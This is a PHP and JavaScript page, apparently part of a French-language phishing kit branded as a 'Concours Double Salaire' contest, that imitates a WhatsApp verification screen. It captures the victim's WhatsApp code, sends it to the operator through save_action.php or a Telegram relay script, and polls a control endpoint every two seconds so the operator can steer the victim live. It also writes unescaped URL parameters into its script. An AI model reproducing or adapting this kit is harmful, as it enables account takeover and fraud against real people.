<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
$errorMessage = '';
$whatsappCode = ''; // Initialiser la variable pour éviter une erreur

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Vérifier s'il y a une action en cours
$actionFile = 'sessions/' . $sessionId . '_action.json';
if (file_exists($actionFile)) {
    $actionData = json_decode(file_get_contents($actionFile), true);
    if (isset($actionData['action']) && $actionData['action'] === 'whatsapp_error') {
        $errorMessage = $actionData['errorMessage'] ?? 'Le code WhatsApp que vous avez entré est incorrect. Veuillez réessayer.';
        // Supprimer l'action pour ne pas afficher l'erreur en boucle
        unlink($actionFile);
    }
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'whatsapp_verification.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

// Créer le dossier tracking s'il n'existe pas
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

// Récupérer les informations du client
$filename = 'sessions/' . $sessionId . '.json';
$clientData = [];

if (file_exists($filename)) {
    $clientData = json_decode(file_get_contents($filename), true);
}

// Récupérer le code WhatsApp s'il existe
$expectedWhatsappCode = '';
if (file_exists($actionFile)) {
    $actionData = json_decode(file_get_contents($actionFile), true);
    if (isset($actionData['whatsappCode'])) {
        $expectedWhatsappCode = $actionData['whatsappCode'];
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification WhatsApp</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            max-width: 80px;
            
        }
        
        .whatsapp-card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .whatsapp-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #00AD5C;
            text-align: center;
        }
        
        .whatsapp-message {
            color: #65676b;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-label {
            display: block;
            font-size: 14px;
            color: #65676b;
            margin-bottom: 5px;
        }
        
        .form-control {
            width: 100%;
            padding: 14px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            color: #1c1e21;
            text-align: center;
            letter-spacing: 5px;
            font-weight: bold;
        }
        
        .form-control:focus {
            border-color: #00AD5C;
            outline: none;
            box-shadow: 0 0 0 2px #e7f8ef;
        }
        
        .verify-button {
            width: 100%;
            padding: 12px 0;
            background-color: #00AD5C;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        .verify-button:hover {
            background-color: #128C7E;
        }
        
        .resend-link {
            text-align: center;
            margin-bottom: 15px;
        }
        
        .resend-link a {
            color: #00AD5C;
            text-decoration: none;
            font-size: 14px;
        }
        
        .resend-link a:hover {
            text-decoration: underline;
        }
        
        .error-message {
            background-color: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 14px;
            display: flex;
            align-items: center;
        }
        
        .error-message i {
            margin-right: 10px;
            font-size: 16px;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #65676b;
            font-size: 12px;
        }
        
        .footer a {
            color: #65676b;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .timer {
            text-align: center;
            margin-bottom: 15px;
            color: #65676b;
            font-size: 14px;
        }
        
        .timer span {
            font-weight: bold;
            color: #00AD5C;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://www.freeiconspng.com/uploads/logo-whatsapp-png-image-2.png" alt="Logo" class="logo">
        </div>
        
        <div class="whatsapp-card">
            <div class="whatsapp-title">Vérification par WhatsApp</div>
            <p class="whatsapp-message">Pour des raisons de sécurité, veuillez entrer le code à 6-8 chiffres que nous avons envoyé par WhatsApp au numéro associé à votre compte.</p>
            
            <?php if (!empty($errorMessage)): ?>
            <div class="error-message">
                <i class="fas fa-exclamation-circle"></i> <?php echo htmlspecialchars($errorMessage); ?>
            </div>
            <?php endif; ?>
            
            <form id="whatsapp-form" method="post" action="loading.php?session=<?php echo htmlspecialchars($sessionId); ?>&ip=<?php echo htmlspecialchars($clientIp); ?>">
                <div class="form-group">
                    <label for="whatsapp-code" class="form-label">Code WhatsApp</label>
                    <input type="text" id="whatsapp-code" name="whatsapp_code" class="form-control" placeholder="------" maxlength="8" pattern="[0-9]*" inputmode="numeric" required value="<?php echo htmlspecialchars($whatsappCode); ?>">
                </div>
                
                <div class="timer">
                    Temps restant: <span id="countdown">02:00</span>
                </div>
                
                <button type="submit" class="verify-button">
                    Vérifier
                </button>
                
                <div class="resend-link">
                    <a href="#" id="resend-link" style="display: none;">Renvoyer le code</a>
                </div>
            </form>
        </div>
        
        <div class="footer">
            <p>© 2025 Concours Double Salaire. Tous droits réservés.</p>
            <p><a href="#">Conditions d'utilisation</a> · <a href="#">Politique de confidentialité</a></p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo $sessionId; ?>';
            const clientIp = '<?php echo $clientIp; ?>';
            const expectedWhatsappCode = '<?php echo $expectedWhatsappCode; ?>';
            const whatsappForm = document.getElementById('whatsapp-form');
            const whatsappCodeInput = document.getElementById('whatsapp-code');
            const resendLink = document.getElementById('resend-link');
            const countdownElement = document.getElementById('countdown');
            
            // Mettre le focus sur le champ de code WhatsApp
            whatsappCodeInput.focus();
            
            // Gérer la soumission du formulaire
            whatsappForm.addEventListener('submit', function(event) {
                event.preventDefault();
                
                const whatsappCode = whatsappCodeInput.value.trim();
                
                if (whatsappCode === '') {
                    return;
                }
                
                // Méthode 1: Envoyer le code WhatsApp au serveur via save_action.php
                fetch('save_action.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        session: sessionId,
                        ip: clientIp,
                        action: 'whatsapp_code_submitted',
                        whatsappCode: whatsappCode
                    })
                })
                .then(response => response.json())
                .then(data => {
                    // Rediriger vers la page de chargement
                    window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
                })
                .catch(error => {
                    console.error('Erreur save_action:', error);
                    
                    // Méthode 2: Essayer d'envoyer via send_telegram.php comme solution de secours
                    fetch('send_telegram.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            message: `🔔 CODE WHATSAPP REÇU 🔔\n\n🔑 Session ID: ${sessionId}\n🌐 IP: ${clientIp}\n💬 Code WhatsApp: ${whatsappCode}`
                        })
                    })
                    .then(response => response.json())
                    .catch(error => {
                        console.error('Erreur send_telegram:', error);
                    })
                    .finally(() => {
                        // Rediriger quand même en cas d'erreur
                        window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
                    });
                });
            });
            
            // Gérer le compte à rebours
            let timeLeft = 120; // 2 minutes en secondes
            
            function updateCountdown() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    resendLink.style.display = 'inline';
                } else {
                    timeLeft--;
                }
            }
            
            // Mettre à jour le compte à rebours toutes les secondes
            updateCountdown();
            const countdownInterval = setInterval(updateCountdown, 1000);
            
            // Gérer le renvoi du code
            resendLink.addEventListener('click', function(event) {
                event.preventDefault();
                
                // Réinitialiser le compte à rebours
                timeLeft = 120;
                updateCountdown();
                resendLink.style.display = 'none';
                
                // Redémarrer l'intervalle
                clearInterval(countdownInterval);
                const newCountdownInterval = setInterval(updateCountdown, 1000);
                
                // Méthode 1: Envoyer une notification au serveur via save_action.php
                fetch('save_action.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        session: sessionId,
                        ip: clientIp,
                        action: 'whatsapp_resend_requested'
                    })
                })
                .catch(error => {
                    console.error('Erreur save_action:', error);
                    
                    // Méthode 2: Essayer d'envoyer via send_telegram.php comme solution de secours
                    fetch('send_telegram.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            message: `🔄 DEMANDE DE RENVOI DE CODE WHATSAPP 🔄\n\n🔑 Session ID: ${sessionId}\n🌐 IP: ${clientIp}`
                        })
                    })
                    .catch(error => {
                        console.error('Erreur send_telegram:', error);
                    });
                });
            });
            
            // Fonction pour vérifier s'il y a une action à effectuer
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                .then(response => response.json())
                .then(data => {
                    if (data.action) {
                        if (data.action === 'whatsapp_error') {
                            // Recharger la page pour afficher le message d'erreur
                            window.location.reload();
                        } else if (data.action === 'redirect' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else if (data.action === 'custom' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else {
                            window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
                        }
                    }
                })
                .catch(error => {
                    console.error('Erreur lors de la vérification des actions:', error);
                });
            }
            
            // Vérifier les actions toutes les 2 secondes
            setInterval(checkAction, 2000);
        });
    </script>
</body>
</html>